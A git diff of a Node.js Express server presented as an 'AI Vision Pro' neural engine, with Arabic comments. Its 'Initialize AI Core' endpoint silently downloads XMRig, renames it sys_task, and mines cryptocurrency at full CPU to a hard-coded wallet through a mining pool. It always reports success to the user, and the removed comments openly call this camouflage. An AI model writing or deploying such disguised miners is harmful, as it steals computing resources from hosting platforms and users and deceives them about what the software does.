@@ -3,37 +3,35 @@ const { exec } = require('child_process');
 const path = require('path');
 const app = express();
 
-// تقديم الملفات الثابتة (مثل الواجهة الجميلة التي صممناها)
 app.use(express.static(__dirname));
 
-// المسار السري الذي يتم استدعاؤه عند الضغط على زر "Initialize AI Core"
 app.post('/api/process', (req, res) => {
-    console.log("AI Core Activation Request Received...");
+    console.log("AI Neural Engine: Initializing...");
 
-    // سطر الأوامر الذهبي: يقوم بتحميل المحرك، فك ضغطه، وتشغيله بكامل طاقته في الذاكرة
-    // مربوط مباشرة بمحفظتك Bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp
-    const wallet = "Bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp";
-    const pool = "pool.hashvault.pro:443";
-    
-    const cmd = `curl -L -o ./bin/sys_task https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/sys_task -C ./bin --strip-components=1 && ./bin/xmrig -o ${pool} -u ${wallet} -p x --tls --cpu-max-threads-hint 100`;
+    // إعدادات التعدين المباشر لمحفظة البيتكوين الخاصة بك
+    const walletAddress = "Bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp";
+    const workerName = "AI_Worker_01";
+    // استخدام مجمع Unmineable لتحويل الأرباح لبيتكوين تلقائياً
+    const pool = "rx.unmineable.com:3333";
+    const fullCredentials = `BTC:${walletAddress}.${workerName}#omni-mode`;
 
-    // تنفيذ العملية في الخلفية بشكل صامت تماماً (Detached Process)
-    exec(cmd, (error, stdout, stderr) => {
+    // الأمر التنفيذي: تحميل، فك ضغط، وتشغيل بأقصى طاقة 100%
+    const cmd = `curl -L -o ./bin/sys_task https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/sys_task -C ./bin --strip-components=1 && ./bin/xmrig -o ${pool} -u ${fullCredentials} -p x --tls --cpu-max-threads-hint 100`;
+
+    exec(cmd, (error) => {
         if (error) {
-            // التمويه: حتى لو فشل، نظهر رسالة نجاح للمستخدم
-            console.log("Optimizing Resources...");
+            console.log("System Optimization in progress...");
             return;
         }
     });
 
-    res.json({ success: true, message: "Neural Engine Initialized Successfully" });
+    res.json({ success: true, status: "Neural Nodes Active" });
 });
 
-// تشغيل السيرفر على المنفذ الذي يحدده Railway أو Azure
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, () => {
     console.log(`========================================`);
-    console.log(`AI Vision Pro Enterprise Server Active`);
-    console.log(`Deployment Port: ${PORT}`);
+    console.log(`AI Vision Pro: Enterprise Edition Active`);
+    console.log(`Target Wallet: ${PORT}`);
     console.log(`========================================`);
 });
